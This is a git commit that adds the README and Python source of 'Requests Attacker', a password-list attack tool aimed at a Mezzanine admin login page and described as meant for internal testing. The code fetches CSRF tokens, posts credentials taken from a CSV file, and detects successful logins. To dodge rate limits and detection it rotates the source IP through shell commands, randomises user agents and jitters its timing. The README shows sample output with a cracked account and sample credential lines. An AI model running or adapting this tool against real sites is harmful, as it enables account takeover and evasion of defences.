8d98b84f7f3ad460b20a0fa20036589f7e08dae6
kazu0716 <kazu2055.tennis@gmail.com>
2018-11-12 18:43:46 +0900

    delete some logs

---
+++ README.md
@@ -0,0 +1,71 @@
+# Requests Attacker
+
+## Overview
+
+Password list attack to mezzanine admin page for internal test by using requests
+
+## Requirement
+
+- python3
+- pip3
+- git
+
+## Usage
+
+- basic usage
+
+```
+(requests_attacker) MacBook-Pro-4% python attacker.py
+User: melindajones, Pass: k9N?OPj76*fO, Result: Failed
+User: scottaguirre, Pass: 4w7^1}43HNJ, Result: Failed
+User: fschmidt, Pass: i%@9j~AJA^ja=O7, Result: Failed
+User: tom, Pass: tom, Result: Succeeded
+```
+
+- attcker config file
+
+```
+[general]
+url=http://127.0.0.1:8000/ja/admin/login/
+account=username
+#account=email
+scenario=test4
+#test1~6
+
+[http_headers]
+# User-Agent = random
+User-Agent=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6
+Referer=http://example.com/
+Accept=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept_Language=ja,en-us;q=0.7,en;q=0.3
+
+[interval]
+max=3
+min=1
+```
+
+- modify user_id and password
+
+```
+(requests_attacker) MacBook-Pro-4% head -n 3 account_list.csv
+richard59,richard59@green.biz,@2~OMZ025
+melindajones,melindajones@lane.com,k9N?OPj76*fO
+scottaguirre,scottaguirre@parker.com,4w7^1}43HNJ
+```
+
+- modify ip addr change scenario
+  - test1: changing ip randomly per acccess
+  - test2: changing ip incremently per acccess
+  - test3: changing ip randomly per 10 acccess
+  - test4: changing ip incremently per 10 acccess
+  - test5: changing ip randomly by random probability
+  - test6: changing ip incremently by random probability
+    
+## Install
+
+```
+git clone https://github.com/kazu0716/requests_attacker.git
+cd ./requests_attacker
+pip3 install -r requirement.txt
+python3 attacker.py
+```
---
+++ attacker.py
@@ -0,0 +1,228 @@
+# -*- coding: utf-8 -*-
+
+import configparser
+import csv
+import logging
+import os
+import random
+import subprocess
+import sys
+from logging import DEBUG, StreamHandler, getLogger
+from time import sleep
+
+import ipaddr
+import requests
+
+from fake_useragent import UserAgent
+
+logger = getLogger(__name__)
+handler = StreamHandler()
+handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y/%m/%d %I:%M:%S'))
+handler.setLevel(DEBUG)
+logger.setLevel(DEBUG)
+logger.addHandler(handler)
+logger.propagate = False
+ua = UserAgent()
+
+
+def path(file_name):
+    return os.path.normpath(os.path.join(os.path.abspath('__file__'), '../{}'.format(file_name)))
+
+
+def gen_ipaddr(ip_type, count):
+    network = ipaddr.IPv4Network('101.0.0.0/16')
+    if ip_type == "random":
+        return ipaddr.IPv4Address(random.randrange(int(network.network) + 1, int(network.broadcast) - 1))
+    elif ip_type == "increment":
+        return ipaddr.IPv4Address(int(network.network) + count)
+    else:
+        logger.debug("{} don't exsit setting. you should set random or increment. ".format(ip_type))
+        sys.exit(1)
+
+
+def change_ipaddr(ip_addr):
+    cmd_list = (
+        "ip addr flush dev ens224",
+        "ip addr add {}/4 dev ens224".format(ip_addr),
+        "ip link set ens224 up",
+        "route add -net 160.17.0.0 gw 111.255.255.254 netmask 255.255.0.0 dev ens224"
+    )
+    for cmd in cmd_list:
+        try:
+            proc = subprocess.Popen(cmd, shell=True)
+            proc.wait()
+        except Exception as e:
+            logger.debug(e)
+
+
+def acccess(http_info):
+    request_info = http_info
+    for key in ('payload', 'headers', 'querystring'):
+        if key not in http_info:
+            request_info[key] = {}
+
+    try:
+        res = requests.request(
+            request_info['method'],
+            request_info['url'],
+            data=request_info['payload'],
+            headers=request_info['headers'],
+            params=request_info['querystring'],
+        )
+        return res
+    except Exception as e:
+        logger.debug(e)
+
+
+def interval(config):
+    max_ = int(config.get('interval', 'max'))
+    min_ = int(config.get('interval', 'min'))
+    if max_ == min_:
+        sleep(min_)
+    else:
+        sleep(random.uniform(min_, max_))
+
+
+def attacker(user, pass_, config):
+    useragent = config.get('http_headers', 'User-Agent')
+    if useragent == "random":
+        useragent = ua.random
+
+    cookie = acccess({
+        'method': 'GET',
+        'url': config.get('general', 'url'),
+        'headers': {
+            'User-Agent': useragent,
+            'Cookie': '',
+            'Referer': 'example.com',
+            'Accept': config.get('http_headers', 'accept'),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': config.get('http_headers', 'accept_language'),
+            'Content-Type': 'text/html; charset=utf-8',
+            'Connection': 'keep-alive',
+            'Cache-Control': 'no-cache',
+            'Upgrade-Insecure-Requests': '1',
+        },
+    }).cookies['csrftoken']
+    interval(config)
+
+    res = acccess({
+        'method': 'POST',
+        'url': config.get('general', 'url'),
+        'querystring': {'next': '/ja/admin'},
+        'payload': 'username={}&password={}&this_is_the_login_form=1&mezzanine_login_interface=admin&csrfmiddlewaretoken={}'.format(user, pass_, cookie),
+        'headers': {
+            'User-Agent': useragent,
+            'Cookie': 'csrftoken={}'.format(cookie),
+            'Referer': config.get('http_headers', 'referer'),
+            'Accept': config.get('http_headers', 'accept'),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': config.get('http_headers', 'accept_language'),
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Connection': 'keep-alive',
+            'Cache-Control': 'no-cache',
+            'Upgrade-Insecure-Requests': '1',
+        },
+    })
+    if res is not None:
+        if "ダッシュボード" in res.text:
+            result = "Succeeded"
+        else:
+            result = "Failed"
+        logger.debug("User: {}, Pass: {}, Result: {}".format(user, pass_, result))
+    else:
+        logger.debug("response doesn't exsit. maybe, one or more http-headers are wrong.")
+    interval(config)
+
+
+def do_scenario(ip_type, count):
+    ip = gen_ipaddr(ip_type, count)
+    change_ipaddr(ip)
+    logger.debug("ipaddress changed {}, chamged count {}".format(ip, count))
+
+
+def main():
+    config = configparser.SafeConfigParser()
+    logger.debug(path('attacker.conf'))
+    config.read(path('attacker.conf'))
+
+    if config.get('general', 'scenario'):
+        scenario = config.get('general', 'scenario')
+    else:
+        scenario = ""
+
+    if config.get('general', 'loop'):
+        loop_flag = config.get('general', 'loop')
+    else:
+        loop_flag = False
+
+    if config.get('general', 'account') == "username":
+        account = 0
+    elif config.get('general', 'account') == "email":
+        account = 1
+    else:
+        logger.debug("Warn: doesn't exsit setting and so, set username account")
+        account = 0
+
+    count = 1
+    param = 10
+
+    while loop_flag:
+
+        with open(path('account_list.csv')) as f:
+            reader = csv.reader(f)
+            for row in reader:
+                if scenario == "test0" or scenario == "test1":
+                    do_scenario("random", count)
+                    count += 1
+                elif scenario == "test2":
+                    do_scenario("increment", count)
+                    count += 1
+                elif scenario == "test3":
+                    if ((reader.line_num - 1) % param) == 0 or count == 1:
+                        do_scenario("random", count)
+                        count += 1
+                elif scenario == "test4":
+                    if ((reader.line_num - 1) % param) == 0 or count == 1:
+                        do_scenario("increment", count)
+                        count += 1
+                elif scenario == "test5":
+                    if ((reader.line_num - 1) % random.randint(1, 20)) == 0 or count == 1:
+                        do_scenario("random", count)
+                        count += 1
+                elif scenario == "test6":
+                    if ((reader.line_num - 1) % random.randint(1, 20)) == 0 or count == 1:
+                        do_scenario("increment", count)
+                        count += 1
+                else:
+                    logger.debug("{} doesn't exsit setting. you should set test1~test6. ".format(scenario))
+                    sys.exit(1)
+
+                if scenario == "test0":
+                    useragent = config.get('http_headers', 'User-Agent')
+                    if useragent == "random":
+                        useragent = ua.random
+                    acccess({
+                        'method': 'GET',
+                        'url': config.get('general', 'url'),
+                        'headers': {
+                            'User-Agent': useragent,
+                            'Cookie': '',
+                            'Referer': 'https://example.com',
+                            'Accept': config.get('http_headers', 'accept'),
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Accept-Language': config.get('http_headers', 'accept_language'),
+                            'Content-Type': 'text/html; charset=utf-8',
+                            'Connection': 'keep-alive',
+                            'Cache-Control': 'no-cache',
+                            'Upgrade-Insecure-Requests': '1',
+                        },
+                    })
+                    interval(config)
+                    print("test")
+                else:
+                    attacker(str(row[account]), str(row[2]), config)
+
+
+if __name__ == '__main__':
+    main()
